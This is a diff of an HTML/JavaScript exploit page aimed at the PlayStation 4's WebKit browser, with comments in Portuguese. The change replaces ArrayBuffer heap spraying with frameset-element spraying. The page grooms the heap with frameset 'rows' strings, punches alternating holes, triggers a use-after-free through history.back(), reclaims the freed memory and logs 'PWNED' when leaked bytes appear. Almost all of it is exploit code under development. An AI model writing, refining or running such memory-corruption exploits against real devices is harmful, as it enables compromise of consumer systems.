@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - Sandwich Strategy</title>
+<title>PS4 WebKit - Pure FastMalloc Sandwich</title>
 <style>
     body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
     button { 
@@ -12,13 +12,14 @@
         text-transform: uppercase;
     }
     #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
+    .success { color: #000; background-color: #0f0; padding: 5px; font-weight: bold;}
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - 3-Step Spray (Sandwich Strategy)</h2>
-<div id="status">Aguardando...</div>
+<h2>PS4 WebKit - Pure FastMalloc Sandwich</h2>
+<div id="status">Estratégia: Tudo via Frameset (FastMalloc)</div>
 
-<button onclick="runSandwichExploit()">INICIAR ATAQUE SANDUÍCHE</button>
+<button onclick="runFastMallocSandwich()">INICIAR SANDUÍCHE (FRAMESET)</button>
 
 <div id="log"></div>
 
@@ -27,6 +28,7 @@ const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
 function log(m, type="") { 
     const d = document.createElement("div");
+    if(type) d.className = type;
     d.textContent = m;
     logEl.appendChild(d);
     logEl.scrollTop = logEl.scrollHeight;
@@ -34,48 +36,55 @@ function log(m, type="") {
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 var grooming = []; // Spray 1
-var attack = [];   // Spray 3
+var attack = [];   // Spray 2
 
-// TÉCNICA PSFREE: GC para limpar e organizar
+// TÉCNICA PSFREE: GC para limpar
 function forceGC() {
     for (let i = 0; i < 2; i++) {
         new Uint8Array(4 * 1024 * 1024);
     }
 }
 
-async function runSandwichExploit() {
+async function runFastMallocSandwich() {
     logEl.innerHTML = "";
     grooming = [];
     attack = [];
     statusEl.innerText = "Preparando...";
 
-    const TARGET_SIZE = 340356;
+    // Alvo: 340.356 bytes
+    // Frameset: / 8 = ~42544 vírgulas
+    const COMMAS = 42544;
+    const VARIATION = 64; // Variação para alinhar headers
     
-    // === PASSO 1: PRE-SPRAY (GROOMING) ===
-    // Enchemos o Heap com "paredes" para evitar que o buraco mude de tamanho
-    log("1. [SPRAY 1] Preparando o terreno (Grooming)...");
+    // === PASSO 1: PRE-SPRAY (GROOMING COM FRAMESET) ===
+    log("1. [SPRAY 1] Grooming com Framesets (FastMalloc)...");
     
-    const GROOM_COUNT = 1000;
-    for(let i=0; i<GROOM_COUNT; i++) {
-        // Usamos ArrayBuffer para ser idêntico ao alvo final
-        let buf = new ArrayBuffer(TARGET_SIZE);
-        let view = new Uint32Array(buf);
-        view[0] = 0x11111111; // Marcador visual
-        grooming.push({ buf: buf, id: i });
+    // Criamos ~500 framesets para preencher o heap
+    // Usamos tamanhos variados para garantir que criamos buracos de todos os tamanhos possíveis
+    for(let i=0; i<500; i++) {
+        // Varia o tamanho levemente
+        let delta = (i % (VARIATION * 2)) - VARIATION;
+        let count = COMMAS + delta;
+        
+        try {
+            let f = document.createElement("frameset");
+            f.rows = ",".repeat(count);
+            grooming.push({ el: f, count: count });
+        } catch(e) {}
     }
     
     log("2. Criando buracos (Swiss Cheese)...");
-    // Liberamos objetos alternados (pares) para criar espaços onde o UAF vai cair
+    // Liberamos objetos alternados para criar espaços
     let holes = 0;
-    for(let i=0; i<GROOM_COUNT; i+=2) {
+    for(let i=0; i<grooming.length; i+=2) {
+        grooming[i].el.rows = ""; // Libera a memória
         grooming[i] = null;
         holes++;
     }
     
-    // Força o GC para efetivar os buracos
     forceGC();
     await sleep(100);
-    log(`${holes} buracos preparados para receber o UAF.`);
+    log(`${holes} buracos preparados.`);
 
     // === PASSO 2: TRIGGER UAF (INTACTO) ===
     log("3. Disparando UAF Original...");
@@ -92,17 +101,16 @@ async function runSandwichExploit() {
         
         // MOMENTO DO ATAQUE
         if (i === 47) {
-            log(">>> [SPRAY 3] RECLAIM <<<");
+            log(">>> [SPRAY 2] RECLAIM VIA FRAMESET <<<");
             
             // Agenda a liberação
             setTimeout(() => history.back(), 0);
             
-            // Executa o spray de ataque IMEDIATAMENTE
-            // Como temos "paredes" (os buffers ímpares do grooming), 
-            // o buraco não pode expandir. O spray deve encaixar.
-            doAttackSpray(TARGET_SIZE);
+            // Spray Síncrono Imediato
+            // Tentamos preencher com framesets novamente
+            // Como usamos frameset no grooming, o buraco deve ser compatível
+            doFramesetAttack(COMMAS);
             
-            // GC rápido pós-ataque
             setTimeout(() => forceGC(), 10);
         } else {
             size += STEP;
@@ -116,24 +124,15 @@ async function runSandwichExploit() {
     checkResult();
 }
 
-function doAttackSpray(size) {
-    // Cria buffers de ataque
-    // Variação pequena (-16 a +16) só por segurança de header
-    for(let delta = -16; delta <= 16; delta += 4) {
-        for(let k=0; k<50; k++) {
-            try {
-                let buf = new ArrayBuffer(size + delta);
-                let view = new Uint32Array(buf);
-                // Marcador 'AAAA'
-                view[0] = 0x41414141; 
-                view[1] = 0x41414141;
-                // Preenche o meio também
-                let mid = Math.floor(view.length / 2);
-                view[mid] = 0x41414141;
-                
-                attack.push(buf);
-            } catch(e) {}
-        }
+function doFramesetAttack(baseCount) {
+    // Variação de tamanho para acertar o buraco exato
+    for(let delta = -64; delta <= 64; delta += 2) {
+        try {
+            let count = baseCount + delta;
+            let f = document.createElement("frameset");
+            f.rows = ",".repeat(count);
+            attack.push(f);
+        } catch(e) {}
     }
 }
 
@@ -143,25 +142,27 @@ function checkResult() {
     let changed = false;
     let sample = "";
     
-    // Procura por 'A' (0x41)
+    // Se funcionar, a URL não será mais "VVVV".
+    // Ela será composta por bytes que representam a estrutura Length do C++
+    // Geralmente muitos 00 e alguns 01 ou ponteiros.
     for(let i=1000; i<5000; i++) {
-        if(url.charCodeAt(i) === 0x41) { 
+        if(url.charCodeAt(i) !== 0x56) { // 0x56 é 'V'
             changed = true;
-            sample = "Encontrado 'AAAA' no offset " + i;
+            for(let k=0; k<16; k++) {
+                sample += url.charCodeAt(i+k).toString(16).padStart(2,'0') + " ";
+            }
             break;
         }
     }
 
     if(changed) {
-        log("!!! JACKPOT !!!");
-        log("Técnica de 3 Sprays funcionou!");
-        log(sample);
-        statusEl.innerText = "PWNED";
-        statusEl.style.backgroundColor = "#0f0";
-        statusEl.style.color = "#000";
+        log("!!! JACKPOT !!!", "success");
+        log("Memória Reclamada por Frameset!");
+        log("Dados Binários: " + sample);
+        statusEl.innerText = "PWNED: FRAMESET";
     } else {
         log("Falha: Ainda vendo 'V'.");
-        log("O UAF pode estar caindo fora dos buracos preparados.");
+        log("O buraco pode estar sendo roubado por outro processo interno ou o tamanho do grooming não casou.");
     }
 }
 </script>
